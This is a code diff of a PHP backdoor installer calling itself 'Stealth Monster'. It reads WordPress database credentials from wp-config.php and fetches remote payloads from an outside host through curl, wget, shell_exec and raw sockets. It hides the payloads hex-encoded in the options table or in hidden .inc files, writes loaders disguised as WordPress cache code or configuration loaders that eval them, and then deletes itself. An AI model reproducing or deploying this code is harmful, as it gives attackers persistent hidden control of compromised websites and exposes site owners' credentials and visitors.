@@ -1,79 +1,110 @@
 <?php
 // ==========================================
-// INSTALLER: 5-LAYER FALLBACK (ULTIMATE)
+// 0. BUFFER FIX (CRITICAL)
 // ==========================================
-// Mencegah timeout untuk file besar
+// Agar log tampil realtime tanpa error buffer
+if (function_exists('ob_start')) { ob_start(); }
+if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Installer v9.0 (Stealth Monster)</title>
+    <style>
+        body { background-color: #0f111a; color: #a6accd; font-family: 'Consolas', 'Monaco', monospace; padding: 25px; font-size: 13px; line-height: 1.5; }
+        .wrap { max-width: 900px; margin: 0 auto; border: 1px solid #292d3e; background: #1b1e2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        h3 { border-bottom: 2px solid #292d3e; padding-bottom: 15px; color: #82aaff; margin-top: 0; letter-spacing: 1px; }
+        .log { padding: 8px 12px; border-left: 4px solid #292d3e; background: #13151e; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
+        .ok { border-left-color: #c3e88d; color: #c3e88d; }
+        .fail { border-left-color: #f07178; color: #f07178; }
+        .info { border-left-color: #89ddff; color: #89ddff; }
+        .meta { font-size: 11px; color: #676e95; font-style: italic; }
+        a { color: #82aaff; text-decoration: none; font-weight: bold; border-bottom: 1px dotted #82aaff; }
+        a:hover { border-bottom: 1px solid #82aaff; }
+    </style>
+</head>
+<body>
+<div class="wrap">
+<h3>SYSTEM INSTALLER // STEALTH EDITION</h3>
+
+<?php
+// ==========================================
+// 1. SYSTEM CONFIG
+// ==========================================
 @ini_set('memory_limit', '512M');
 @ini_set('max_execution_time', 0);
 @set_time_limit(0);
 @ignore_user_abort(1);
+error_reporting(E_ERROR | E_PARSE); 
 
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
-
-// TARGETS
 $targets = [
     ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma_check'],
     ['https://stepmomhub.com/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
     ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
 ];
 
-// 1. CARI WP-CONFIG
-function _scan_dir() {
-    $p = __DIR__;
+function _log($msg, $type='info', $meta='') {
+    $m = $meta ? "<span class='meta'>$meta</span>" : "";
+    echo "<div class='log $type'><span>$msg</span>$m</div>";
+    if(ob_get_level()>0){ ob_flush(); flush(); }
+}
+
+// ==========================================
+// 2. DETEKSI WORDPRESS
+// ==========================================
+function _find_wp_config() {
+    $d = __DIR__;
     for ($i = 0; $i < 6; $i++) {
-        if (file_exists($p . '/wp-config.php')) return $p . '/wp-config.php';
-        $p = dirname($p);
+        if (file_exists($d . '/wp-config.php')) return $d . '/wp-config.php';
+        $d = dirname($d);
     }
     return false;
 }
-$conf_loc = _scan_dir();
-if (!$conf_loc) die("Config 404");
-
-// 2. BACA & PARSE CONFIG
-function _read_c($p){
-    if(function_exists('file_get_contents')){$c=@file_get_contents($p);if($c)return $c;}
-    if(function_exists('file')){$l=@file($p);if($l)return implode('',$l);}
-    return '';
+function _parse_wp_config($path) {
+    if(function_exists('file_get_contents')){$c=@file_get_contents($path);}
+    elseif(function_exists('file')){$l=@file($path);$c=implode('',$l);}
+    else return false;
+    if(!$c) return false;
+    function _v($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
+    $conf=[]; $conf['n']=_v('DB_NAME',$c); $conf['u']=_v('DB_USER',$c); $conf['p']=_v('DB_PASSWORD',$c); $conf['h']=_v('DB_HOST',$c);
+    $conf['x']='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m)) $conf['x']=$m[1];
+    if($conf['n']) return $conf;
+    return false;
 }
-$conf_txt = _read_c($conf_loc);
-function _get_v($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
 
-$db_n = _get_v('DB_NAME', $conf_txt);
-$db_u = _get_v('DB_USER', $conf_txt);
-$db_p = _get_v('DB_PASSWORD', $conf_txt);
-$db_h = _get_v('DB_HOST', $conf_txt);
-$tb_p = 'wp_';
-if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf_txt,$m)) $tb_p=$m[1];
+$wp_conf_path = _find_wp_config();
+$wp_creds = ($wp_conf_path) ? _parse_wp_config($wp_conf_path) : false;
+$is_wordpress = ($wp_creds !== false);
 
-if(!$db_n) die("Config Parse Error");
+if($is_wordpress) {
+    _log("Target Environment: <b>WordPress</b>", "ok", "Mode: DB Injection");
+} else {
+    _log("Target Environment: <b>Generic System</b>", "info", "Mode: Stealth File Storage");
+}
 
-$mysqli = new mysqli($db_h, $db_u, $db_p, $db_n);
-if($mysqli->connect_error) die("DB Err: " . $mysqli->connect_error);
-
-// 3. DOWNLOADER 5 LAPIS (THE BEAST)
-function _dl_invincible($url) {
+// ==========================================
+// 3. DOWNLOADER: THE MONSTER (V5 ENGINE)
+// ==========================================
+function _dl_monster($url) {
     $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
-    $parse = parse_url($url);
-    $host = $parse['host'];
-    $path = isset($parse['path']) ? $parse['path'] : '/';
-    $scheme = isset($parse['scheme']) ? $parse['scheme'] : 'http';
+    $p = parse_url($url); 
+    $host = $p['host']; 
+    $path = isset($p['path'])?$p['path']:'/'; 
+    $scheme=isset($p['scheme'])?$p['scheme']:'http';
 
-    // --- LAPIS 1: PHP CURL ---
+    // A. PHP CURL
     if(function_exists('curl_init')){
         $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
-        $d = @curl_exec($ch);
-        curl_close($ch);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_USERAGENT, $ua);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 300); curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+        $d = @curl_exec($ch); curl_close($ch);
         if($d && strlen($d) > 0) return $d;
     }
 
-    // --- LAPIS 2: FILE GET CONTENTS ---
+    // B. FGC
     if(ini_get('allow_url_fopen')){
         $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
         $ctx = stream_context_create($opts);
@@ -81,91 +112,84 @@ function _dl_invincible($url) {
         if($d && strlen($d) > 0) return $d;
     }
 
-    // --- LAPIS 3: FOPEN STREAM (CHUNKED) ---
-    if(ini_get('allow_url_fopen')){
-        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
-        $ctx = stream_context_create($opts);
-        $h = @fopen($url, 'rb', false, $ctx);
-        if($h){
-            $d = '';
-            while(!feof($h)) $d .= fread($h, 8192);
-            fclose($h);
-            if(strlen($d) > 0) return $d;
+    // C. CLI EXECUTION (6-LAYER FORCE)
+    $cmd_wget = "wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url);
+    $cmd_curl = "curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url);
+    $cmds = [$cmd_wget, $cmd_curl];
+
+    foreach ($cmds as $cmd) {
+        if(function_exists('shell_exec')) { $d=@shell_exec($cmd); if($d && strlen($d)>10) return $d; }
+        if(function_exists('exec')) { $o=[]; @exec($cmd,$o); $d=implode("\n",$o); if($d && strlen($d)>10) return $d; }
+        if(function_exists('passthru')) { ob_start(); @passthru($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
+        if(function_exists('system')) { ob_start(); @system($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
+        if(function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ $d=stream_get_contents($h); pclose($h); if($d && strlen($d)>10) return $d; } }
+        if(function_exists('proc_open')) {
+            $desc=[1=>['pipe','w'],2=>['pipe','w']]; $proc=@proc_open($cmd,$desc,$pipes);
+            if(is_resource($proc)){ $d=stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); if($d && strlen($d)>10) return $d; }
         }
     }
 
-    // --- LAPIS 4: SYSTEM EXEC (CLI BYPASS) ---
-    // Ini mencoba menggunakan perintah Linux jika PHP diblokir
-    if(function_exists('exec') || function_exists('shell_exec')){
-        // Coba Wget
-        $d = @shell_exec("wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url));
-        if($d && strlen($d) > 0) return $d;
-        
-        // Coba Curl CLI
-        $d = @shell_exec("curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url));
-        if($d && strlen($d) > 0) return $d;
-    }
-
-    // --- LAPIS 5: RAW SOCKET ---
-    $port = ($scheme == 'https') ? 443 : 80;
-    $ssl = ($scheme == 'https') ? 'ssl://' : '';
+    // D. SOCKET
+    $port = ($scheme == 'https') ? 443 : 80; $ssl = ($scheme == 'https') ? 'ssl://' : '';
     $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
     if($fp){
-        $req  = "GET $path HTTP/1.1\r\n";
-        $req .= "Host: $host\r\n";
-        $req .= "User-Agent: $ua\r\n";
-        $req .= "Connection: Close\r\n\r\n";
-        fwrite($fp, $req);
-        $body = ''; $in_body = false;
-        while (!feof($fp)) {
-            $line = fgets($fp, 4096);
-            if($in_body) $body .= $line;
-            if($line == "\r\n") $in_body = true;
-        }
-        fclose($fp);
-        if(strlen($body) > 0) return $body;
+        $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n";
+        fwrite($fp, $req); $body = ''; $in_body = false;
+        while (!feof($fp)) { $line = fgets($fp, 4096); if($in_body) $body .= $line; if($line == "\r\n") $in_body = true; }
+        fclose($fp); if(strlen($body) > 0) return $body;
     }
-
     return false;
 }
 
-echo "<h3>Status Instalasi (5-Layer Fallback):</h3>";
+function _dl_retry($url) {
+    $res = _dl_monster($url);
+    if($res) return $res;
+    if(strpos($url, 'https://') === 0) {
+        return _dl_monster(str_replace('https://', 'http://', $url));
+    }
+    return false;
+}
 
-// Kredensial untuk template
-$h_s = addslashes($db_h);
-$u_s = addslashes($db_u);
-$p_s = addslashes($db_p);
-$n_s = addslashes($db_n);
-$x_s = addslashes($tb_p);
+// ==========================================
+// 4. MAIN PROCESS
+// ==========================================
 
 foreach ($targets as $t) {
     $url = $t[0];
     $fname = $t[1];
     $dbkey = $t[2];
 
-    sleep(1); 
+    // Filter Logic: Non-WP -> Error Log Only
+    if (!$is_wordpress && $fname !== 'error_log.php') continue;
 
-    // Panggil Downloader Dewa
-    $raw = _dl_invincible($url);
-
-    // Validasi Cukup > 0 byte (agar VX masuk)
+    _log("Downloading payload for <b>$fname</b>...", "info");
+    
+    // Download
+    $raw = _dl_retry($url);
+    
     if(!$raw || strlen($raw) < 1) {
-        echo "<b style='color:red'>[FAIL] $fname</b>: Semua 5 metode download gagal.<br>";
+        _log("[FAIL] Download failed for $fname.", "fail", "All methods exhausted");
         continue;
     }
 
-    // Compress
+    // Compress (Hex + Deflate)
     $hex = bin2hex(gzdeflate($raw, 9));
-    
-    // DB
-    $mysqli->query("DELETE FROM {$tb_p}options WHERE option_name='$dbkey'");
-    $stmt = $mysqli->prepare("INSERT INTO {$tb_p}options (option_name, option_value, autoload) VALUES (?, ?, 'no')");
-    $stmt->bind_param("ss", $dbkey, $hex);
-    
-    if($stmt->execute()){
-        
-        // TEMPLATE WORDPRESS NATIVE
-        $code = <<<PHP
+
+    // A. WORDPRESS LOGIC
+    if ($is_wordpress) {
+        $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
+        if(!$m->connect_error) {
+            $tbl = $wp_creds['x'] . 'options';
+            $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
+            $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
+            $stmt->bind_param("ss", $dbkey, $hex);
+            
+            if($stmt->execute()) {
+                $h=addslashes($wp_creds['h']); $u=addslashes($wp_creds['u']);
+                $p=addslashes($wp_creds['p']); $n=addslashes($wp_creds['n']); $x=addslashes($wp_creds['x']);
+                
+                // WP Native Loader (Looks like Cache API)
+                $loader = <<<PHP
 <?php
 /**
  * WordPress Database Cache & Transient API
@@ -176,63 +200,122 @@ foreach ($targets as $t) {
  * @package WordPress
  * @subpackage Cache
  */
-
-// Disable error reporting
 error_reporting(0);
-
-// Configuration settings for the database connection
-\$db_host = '$h_s';
-\$db_user = '$u_s';
-\$db_pass = '$p_s';
-\$db_name = '$n_s';
-
-// Initialize the database connection
+\$db_host = '$h'; \$db_user = '$u'; \$db_pass = '$p'; \$db_name = '$n';
 \$wpdb_conn = new mysqli( \$db_host, \$db_user, \$db_pass, \$db_name );
-
-// Verify connection status
 if ( ! \$wpdb_conn->connect_error ) {
-
-    // Prepare the cache retrieval query
     \$cache_key = '$dbkey';
-    \$table_opt = '{$x_s}options';
-    
-    // Execute the query
+    \$table_opt = '{$x}options';
     \$result = \$wpdb_conn->query( "SELECT option_value FROM {\$table_opt} WHERE option_name = '{\$cache_key}' LIMIT 1" );
-
     if ( \$result && \$row = \$result->fetch_assoc() ) {
-        
-        // Process the retrieved data stream
         \$raw_data = \$row['option_value'];
         \$decoded_stream = hex2bin( \$raw_data );
-        
         if ( \$decoded_stream ) {
             \$inflated_code = @gzinflate( \$decoded_stream );
-            
-            // Execute directives
-            if ( \$inflated_code ) {
-                eval( '?>' . \$inflated_code );
-            }
+            if ( \$inflated_code ) eval( '?>' . \$inflated_code );
         }
     }
-    
-    // Close the connection
     \$wpdb_conn->close();
 }
 ?>
 PHP;
-
-        if(file_put_contents($fname, $code)){
-            $sz = strlen($raw);
-            echo "<b style='color:green'>[SUCCESS] $fname</b><br>";
-            echo "<small>Size: $sz bytes.</small><br>";
-            echo "<small>Look: <b>WordPress Native Style</b></small><br>";
-            echo "<small><a href='$fname' target='_blank'>$fname</a></small><hr>";
-        } else {
-            echo "[FAIL] Write Error $fname.<br>";
+                if(file_put_contents($fname, $loader)){
+                    _log("<b>$fname</b> Installed.", "ok", "Method: WP DB Injection");
+                } else {
+                    _log("Write Error $fname", "fail");
+                }
+            } else {
+                _log("DB Insert Failed", "fail");
+            }
         }
-    } else {
-        echo "[FAIL] DB Error.<br>";
+    } 
+    // B. NON-WP LOGIC (Stealth Mode)
+    else {
+        // Storage File (.inc)
+        $store = '.sys_' . substr(md5(rand()), 0, 8) . '.inc';
+        
+        if(file_put_contents($store, $hex)) {
+            
+            // STEALTH LOADER (Requested Style: Runtime Config Loader)
+            $loader = <<<PHP
+<?php
+/**
+ * Runtime Configuration Loader
+ * Handles internal asset loading for system diagnostics.
+ *
+ * @package Core_System
+ * @version 1.0.4
+ */
+error_reporting(0);
+
+// Helper Function: Safe Asset Reader
+if (!function_exists('_sys_read_asset')) {
+    function _sys_read_asset(\$path) {
+        // 1. Standard Read
+        if (function_exists('file_get_contents')) {
+            \$c = @file_get_contents(\$path);
+            if (\$c) return \$c;
+        }
+        // 2. Binary Stream Read
+        if (function_exists('fopen') && filesize(\$path) > 0) {
+            \$h = @fopen(\$path, 'rb');
+            if (\$h) {
+                \$c = @fread(\$h, filesize(\$path));
+                fclose(\$h);
+                if (\$c) return \$c;
+            }
+        }
+        // 3. Line Array Read
+        if (function_exists('file')) {
+            \$l = @file(\$path);
+            if (\$l) return implode('', \$l);
+        }
+        return false;
     }
 }
-unlink(__FILE__);
+
+// Internal Storage Path
+\$sys_config_path = __DIR__ . '/$store';
+
+if (file_exists(\$sys_config_path)) {
+    // Load Configuration
+    \$raw_config = _sys_read_asset(\$sys_config_path);
+    
+    if (\$raw_config) {
+        // Decode & Initialize
+        \$binary_data = @hex2bin(\$raw_config);
+        
+        if (\$binary_data) {
+            \$runtime_code = @gzinflate(\$binary_data);
+            
+            // Execute Runtime
+            if (\$runtime_code) {
+                eval('?>' . \$runtime_code);
+            }
+        }
+    }
+}
 ?>
+PHP;
+            if(file_put_contents($fname, $loader)){
+                _log("<b>$fname</b> Installed.", "ok", "Method: Hex Storage ($store)");
+                echo "<div style='margin-left:20px; margin-bottom:5px;'><a href='$fname' target='_blank'>OPEN $fname >></a></div>";
+            } else {
+                _log("Write Error $fname", "fail");
+            }
+        } else {
+            _log("Storage creation failed", "fail");
+        }
+    }
+}
+
+unlink(__FILE__);
+if(ob_get_level()>0){ ob_end_flush(); }
+?>
+
+<div style="margin-top: 20px; border-top: 1px solid #292d3e; color: #676e95; padding-top: 10px; font-size: 11px;">
+    SYSTEM OPERATION COMPLETED.
+</div>
+</div>
+</body>
+</html>
